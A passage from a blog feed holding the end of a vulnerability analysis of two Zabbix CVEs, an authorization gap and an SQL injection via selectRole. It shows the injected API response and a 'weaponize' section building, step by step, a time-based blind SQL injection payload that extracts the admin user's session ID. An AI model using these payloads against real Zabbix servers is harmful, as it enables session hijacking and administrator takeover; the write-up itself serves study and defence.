+</span></span><span style="display:flex;"><span>{<span style="color:#f92672">&#34;jsonrpc&#34;</span>:<span style="color:#e6db74">&#34;2.0&#34;</span>,<span style="color:#f92672">&#34;result&#34;</span>:[{<span style="color:#f92672">&#34;userid&#34;</span>:<span style="color:#e6db74">&#34;3&#34;</span>,<span style="color:#f92672">&#34;username&#34;</span>:<span style="color:#e6db74">&#34;user&#34;</span>,<span style="color:#f92672">&#34;name&#34;</span>:<span style="color:#e6db74">&#34;&#34;</span>,<span style="color:#f92672">&#34;surname&#34;</span>:<span style="color:#e6db74">&#34;&#34;</span>,<span style="color:#f92672">&#34;url&#34;</span>:<span style="color:#e6db74">&#34;&#34;</span>,<span style="color:#f92672">&#34;autologin&#34;</span>:<span style="color:#e6db74">&#34;1&#34;</span>,<span style="color:#f92672">&#34;autologout&#34;</span>:<span style="color:#e6db74">&#34;0&#34;</span>,<span style="color:#f92672">&#34;lang&#34;</span>:<span style="color:#e6db74">&#34;default&#34;</span>,<span style="color:#f92672">&#34;refresh&#34;</span>:<span style="color:#e6db74">&#34;30s&#34;</span>,<span style="color:#f92672">&#34;theme&#34;</span>:<span style="color:#e6db74">&#34;default&#34;</span>,<span style="color:#f92672">&#34;attempt_failed&#34;</span>:<span style="color:#e6db74">&#34;0&#34;</span>,<span style="color:#f92672">&#34;attempt_ip&#34;</span>:<span style="color:#e6db74">&#34;&#34;</span>,<span style="color:#f92672">&#34;attempt_clock&#34;</span>:<span style="color:#e6db74">&#34;0&#34;</span>,<span style="color:#f92672">&#34;rows_per_page&#34;</span>:<span style="color:#e6db74">&#34;50&#34;</span>,<span style="color:#f92672">&#34;timezone&#34;</span>:<span style="color:#e6db74">&#34;default&#34;</span>,<span style="color:#f92672">&#34;roleid&#34;</span>:<span style="color:#e6db74">&#34;1&#34;</span>,<span style="color:#f92672">&#34;userdirectoryid&#34;</span>:<span style="color:#e6db74">&#34;0&#34;</span>,<span style="color:#f92672">&#34;ts_provisioned&#34;</span>:<span style="color:#e6db74">&#34;0&#34;</span>,<span style="color:#f92672">&#34;role&#34;</span>:{<span style="color:#f92672">&#34;name&#34;</span>:<span style="color:#e6db74">&#34;User role&#34;</span>,<span style="color:#f92672">&#34;r.roleid AND (SELECT(SLEEP(5)))&#34;</span>:<span style="color:#e6db74">&#34;0&#34;</span>}}],<span style="color:#f92672">&#34;id&#34;</span>:<span style="color:#ae81ff">1</span>}
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">1765238761</span>
+</span></span></code></pre></div><p>Off to a great start! Now, we will set a breakpoint at <span style="font-family: Courier; font-weight: 600"> include/classes/api/services/CUser.php:3046 </span> before running the same curl request again.</p>
+<p><img class="center" alt="vscode-debug-cve-2024-42327-1" src="/posts/zabbix-cve-2024-36467-and-cve-2024-42327-analysis/images/vscode-debug-cve-2024-42327-1.png"><br>
+<link href="/posts/css/caption.css" rel="stylesheet">
+<span class="caption" data-type="figure">Breakpoint on Call to<span style="font-family: Courier; font-weight: 600"> DBSelect() </span><br><br></span></p>
+<p>Continue to step in / over / out until you reach<span style="font-family: Courier; font-weight: 600"> include/db.inc.php:219</span>.</p>
+<p><img class="center" alt="vscode-debug-cve-2024-42327-2" src="/posts/zabbix-cve-2024-36467-and-cve-2024-42327-analysis/images/vscode-debug-cve-2024-42327-2.png"><br>
+<link href="/posts/css/caption.css" rel="stylesheet">
+<span class="caption" data-type="figure">Value of<span style="font-family: Courier; font-weight: 600"> $query </span>at<span style="font-family: Courier; font-weight: 600"> include/db.inc.php:219</span><br><br></span></p>
+<p>I tried squeezing in the whole damn query into the screenshot, and to no one&rsquo;s surprise, it turns out to be rather hard to read.</p>
+<p><img class="center" alt="too-small-eyes-squinting" src="/posts/zabbix-cve-2024-36467-and-cve-2024-42327-analysis/images/too-small-eyes-squinting.gif" width="300" height="200"><br></p>
+<p>For the sake of both our eyesight, here&rsquo;s the full query string in text:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">SELECT</span> u.userid,r.name,r.roleid <span style="color:#66d9ef">AND</span> (<span style="color:#66d9ef">SELECT</span>(SLEEP(<span style="color:#ae81ff">5</span>))) <span style="color:#66d9ef">FROM</span> users u,<span style="color:#66d9ef">role</span> r <span style="color:#66d9ef">WHERE</span> u.roleid<span style="color:#f92672">=</span>r.roleid <span style="color:#66d9ef">AND</span> u.userid<span style="color:#f92672">=</span><span style="color:#ae81ff">3</span>
+</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
+<span class="caption" data-type="listing">Full Query String<br><br></span>
+<p>Because <code>r.roleid</code> is non-zero, MySQL must evaluate the <code>(SELECT(SLEEP(5))</code> sub-query to resolve the <code>AND</code> operator.</p>
+<p>Pretty neat right? But unconditional time-based SQL by itself is pretty useless. Doing a bunch of &lsquo;sleeping&rsquo; isn&rsquo;t just going to make the database dump itself. We need to take this to the next level.</p>
+<h3 id="53-extracting-authentication-token">5.3 Extracting Authentication Token</h3>
+<p>This section is entirely optional for those who only came here to find out how the vulnerability works. Stay, if you wish to learn how to weaponize our payload.</p>
+<p>Take for instance, if we want to extract the <code>sessionid</code> of Admin user as shown in the listing below, what should we do?</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span>mysql<span style="color:#f92672">&gt;</span> <span style="color:#66d9ef">SELECT</span> sessionid <span style="color:#66d9ef">FROM</span> sessions <span style="color:#66d9ef">WHERE</span> userid<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span> <span style="color:#66d9ef">LIMIT</span> <span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span><span style="color:#75715e">----------------------------------+
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#f92672">|</span> sessionid                        <span style="color:#f92672">|</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span><span style="color:#75715e">----------------------------------+
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#f92672">|</span> <span style="color:#ae81ff">8</span>b4e633a7e5b3cce259e1199f0bc4469 <span style="color:#f92672">|</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span><span style="color:#75715e">----------------------------------+
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#ae81ff">1</span> <span style="color:#66d9ef">row</span> <span style="color:#66d9ef">in</span> <span style="color:#66d9ef">set</span> (<span style="color:#ae81ff">0</span>.<span style="color:#ae81ff">00</span> sec)
+</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
+<span class="caption" data-type="listing">Authentication Token of Admin User<br><br></span>
+<p>The answer is fairly simple - We just need to make sure it sleeps only when a certain condition is met. Using a <code>CASE</code> query and the <code>SUBSTRING</code> function, we can craft a sub-query to check if different positions in the <code>sessionid</code> string match a certain character. And if it matches, then <code>SLEEP(5)</code>.</p>
+<p>Still clueless what I&rsquo;m talking about?</p>
+<p><img class="center" alt="cybconfused-nick-young" src="/posts/zabbix-cve-2024-36467-and-cve-2024-42327-analysis/images/confused-nick-young.gif" width="500" height="250"><br></p>
+<p>Don&rsquo;t worry, let&rsquo;s form our payload from the ground up.</p>
+<ol>
+<li>Extract just the first character from <code>sessionid</code>:</li>
+</ol>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span>mysql<span style="color:#f92672">&gt;</span> <span style="color:#66d9ef">SELECT</span>(<span style="color:#66d9ef">SUBSTRING</span>((<span style="color:#66d9ef">SELECT</span> sessionid <span style="color:#66d9ef">FROM</span> sessions <span style="color:#66d9ef">WHERE</span> userid<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span> <span style="color:#66d9ef">LIMIT</span> <span style="color:#ae81ff">1</span>), <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>));
+</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span><span style="color:#75715e">----------------------------------------------------------------------------+
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#f92672">|</span> (<span style="color:#66d9ef">SUBSTRING</span>((<span style="color:#66d9ef">SELECT</span> sessionid <span style="color:#66d9ef">FROM</span> sessions <span style="color:#66d9ef">WHERE</span> userid<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span> <span style="color:#66d9ef">LIMIT</span> <span style="color:#ae81ff">1</span>), <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>)) <span style="color:#f92672">|</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span><span style="color:#75715e">----------------------------------------------------------------------------+
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#f92672">|</span> <span style="color:#ae81ff">8</span>                                                                          <span style="color:#f92672">|</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span><span style="color:#75715e">----------------------------------------------------------------------------+
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#ae81ff">1</span> <span style="color:#66d9ef">row</span> <span style="color:#66d9ef">in</span> <span style="color:#66d9ef">set</span> (<span style="color:#ae81ff">0</span>.<span style="color:#ae81ff">00</span> sec)
+</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
+<span class="caption" data-type="listing">Step 1 of Payload Crafting<br><br></span>
+<ol start="2">
+<li>Check if the first character from <code>sessionid</code> is &lsquo;8&rsquo;:</li>
+</ol>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span>mysql<span style="color:#f92672">&gt;</span> <span style="color:#66d9ef">SELECT</span>(<span style="color:#66d9ef">SUBSTRING</span>((<span style="color:#66d9ef">SELECT</span> sessionid <span style="color:#66d9ef">FROM</span> sessions <span style="color:#66d9ef">WHERE</span> userid<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span> <span style="color:#66d9ef">LIMIT</span> <span style="color:#ae81ff">1</span>), <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>)) <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;8&#39;</span>;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span><span style="color:#75715e">----------------------------------------------------------------------------------+
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#f92672">|</span> (<span style="color:#66d9ef">SUBSTRING</span>((<span style="color:#66d9ef">SELECT</span> sessionid <span style="color:#66d9ef">FROM</span> sessions <span style="color:#66d9ef">WHERE</span> userid<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span> <span style="color:#66d9ef">LIMIT</span> <span style="color:#ae81ff">1</span>), <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>)) <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;8&#39;</span> <span style="color:#f92672">|</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span><span style="color:#75715e">----------------------------------------------------------------------------------+
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#f92672">|</span>                                                                                <span style="color:#ae81ff">1</span> <span style="color:#f92672">|</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span><span style="color:#75715e">----------------------------------------------------------------------------------+
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#ae81ff">1</span> <span style="color:#66d9ef">row</span> <span style="color:#66d9ef">in</span> <span style="color:#66d9ef">set</span> (<span style="color:#ae81ff">0</span>.<span style="color:#ae81ff">00</span> sec)
+</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
+<span class="caption" data-type="listing">Step 2 of Payload Crafting<br><br></span>
+<ol start="3">
+<li>Sleep for 5 seconds if true:</li>
+</ol>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span>mysql<span style="color:#f92672">&gt;</span> <span style="color:#66d9ef">SELECT</span> <span style="color:#66d9ef">CASE</span> <span style="color:#66d9ef">WHEN</span> <span style="color:#ae81ff">1</span> <span style="color:#66d9ef">THEN</span> SLEEP(<span style="color:#ae81ff">5</span>) <span style="color:#66d9ef">END</span>;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span><span style="color:#75715e">-------------------------------+
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#f92672">|</span> <span style="color:#66d9ef">CASE</span> <span style="color:#66d9ef">WHEN</span> <span style="color:#ae81ff">1</span> <span style="color:#66d9ef">THEN</span> SLEEP(<span style="color:#ae81ff">5</span>) <span style="color:#66d9ef">END</span> <span style="color:#f92672">|</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span><span style="color:#75715e">-------------------------------+
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#f92672">|</span>                             <span style="color:#ae81ff">0</span> <span style="color:#f92672">|</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span><span style="color:#75715e">-------------------------------+
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#ae81ff">1</span> <span style="color:#66d9ef">row</span> <span style="color:#66d9ef">in</span> <span style="color:#66d9ef">set</span> (<span style="color:#ae81ff">5</span>.<span style="color:#ae81ff">00</span> sec)
+</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
+<span class="caption" data-type="listing">Step 3 of Payload Crafting<br><br></span>
+<ol start="4">
+<li>Sleep for 5 seconds if the first character from <code>sessionid</code> is &lsquo;8&rsquo;:</li>
+</ol>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span>mysql<span style="color:#f92672">&gt;</span> <span style="color:#66d9ef">SELECT</span> <span style="color:#66d9ef">CASE</span> <span style="color:#66d9ef">WHEN</span> (<span style="color:#66d9ef">SELECT</span>(<span style="color:#66d9ef">SUBSTRING</span>((<span style="color:#66d9ef">SELECT</span> sessionid <span style="color:#66d9ef">FROM</span> sessions <span style="color:#66d9ef">WHERE</span> userid<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span> <span style="color:#66d9ef">LIMIT</span> <span style="color:#ae81ff">1</span>), <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>)) <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;8&#39;</span>) <span style="color:#66d9ef">THEN</span> SLEEP(<span style="color:#ae81ff">5</span>) <span style="color:#66d9ef">END</span>;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span><span style="color:#75715e">----------------------------------------------------------------------------------------------------------------------+
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#f92672">|</span> <span style="color:#66d9ef">CASE</span> <span style="color:#66d9ef">WHEN</span> (<span style="color:#66d9ef">SELECT</span>(<span style="color:#66d9ef">SUBSTRING</span>((<span style="color:#66d9ef">SELECT</span> sessionid <span style="color:#66d9ef">FROM</span> sessions <span style="color:#66d9ef">WHERE</span> userid<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span> <span style="color:#66d9ef">LIMIT</span> <span style="color:#ae81ff">1</span>), <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>)) <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;8&#39;</span>) <span style="color:#66d9ef">THEN</span> SLEEP(<span style="color:#ae81ff">5</span>) <span style="color:#66d9ef">END</span> <span style="color:#f92672">|</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span><span style="color:#75715e">----------------------------------------------------------------------------------------------------------------------+
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#f92672">|</span>                                                                                                                    <span style="color:#ae81ff">0</span> <span style="color:#f92672">|</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span><span style="color:#75715e">----------------------------------------------------------------------------------------------------------------------+
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#ae81ff">1</span> <span style="color:#66d9ef">row</span> <span style="color:#66d9ef">in</span> <span style="color:#66d9ef">set</span> (<span style="color:#ae81ff">5</span>.<span style="color:#ae81ff">00</span> sec)
+</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
+<span class="caption" data-type="listing">Last Step of Payload Crafting<br><br></span>
+<p>That wasn&rsquo;t so hard, was it? Using this methodology, you will be able to do the same to extract out the remaining string of the <code>sessionid</code>.</p>
+<h2 id="6-conclusion">6. Conclusion</h2>
+<p>Short and brutal: two avoidable bugs, one painful lesson.</p>
+<ul>
+<li>CVE-2024-36467: an authorization/logic gap allows an authenticated API user to add themselves to privileged groups.</li>
+<li>CVE-2024-42327: an SQL injection through unvalidated <code>selectRole</code> values enables time-based data extraction.</li>
+</ul>
+<p>This post has certainly been an awfully long one. I really do hope you actually got to learn something. Otherwise, I may start questioning my life choices, and should just spend more time gaming 🤪.</p>
+<p>This year is already coming to an end, but our journey has only just begun. I&rsquo;m grateful for all the opportunities life has given me thus far, and hope that it remains kind, not just to me but to you as well. This should be my last post for the year, and I hope to see you again soon!</p>
+<h2 id="7-references">7. References</h2>
+<ol>
+<li>NVD - CVE-2024-36467: <a href="https://nvd.nist.gov/vuln/detail/CVE-2024-36467">https://nvd.nist.gov/vuln/detail/CVE-2024-36467</a></li>
+<li>NVD - CVE-2024-42327: <a href="https://nvd.nist.gov/vuln/detail/CVE-2024-42327">https://nvd.nist.gov/vuln/detail/CVE-2024-42327</a></li>
+<li>Zabbix API manual: <a href="https://www.zabbix.com/documentation/7.0/en/manual/api#performing-requests">https://www.zabbix.com/documentation/7.0/en/manual/api#performing-requests</a></li>
+<li>Zabbix DB scripts &amp; docs: <a href="https://www.zabbix.com/documentation/7.0/en/manual/appendix/install/db_scripts">https://www.zabbix.com/documentation/7.0/en/manual/appendix/install/db_scripts</a></li>
+<li>Zabbix container images: <a href="https://www.zabbix.com/container_images">https://www.zabbix.com/container_images</a></li>
+<li>Zabbix source (GitHub): <a href="https://github.com/zabbix/zabbix">https://github.com/zabbix/zabbix</a></li>
+<li>Source archive used in this post: <a href="https://github.com/zabbix/zabbix/archive/refs/tags/7.0.0rc3.zip">https://github.com/zabbix/zabbix/archive/refs/tags/7.0.0rc3.zip</a></li>
+<li>PHP <code>implode()</code> behavior: <a href="https://www.php.net/manual/en/function.implode.php">https://www.php.net/manual/en/function.implode.php</a></li>
+<li>MySQL <code>SLEEP()</code> (time-based techniques): <a href="https://dev.mysql.com/doc/refman/8.0/en/miscellaneous-functions.html#function_sleep">https://dev.mysql.com/doc/refman/8.0/en/miscellaneous-functions.html#function_sleep</a></li>
+<li>PHP prepared statements (recommended mitigation): <a href="https://www.php.net/manual/en/pdo.prepared-statements.php">https://www.php.net/manual/en/pdo.prepared-statements.php</a></li>
+</ol>
+<h2 id="8-resources">8. Resources</h2>
+<ol>
+<li><a href="/posts/zabbix-cve-2024-36467-and-cve-2024-42327-analysis/resources/compose.yml">compose.yml</a></li>
+</ol>
+]]></content>
+        </item>
         
         <item>
             <title>Managing SSH Users with Certs</title>
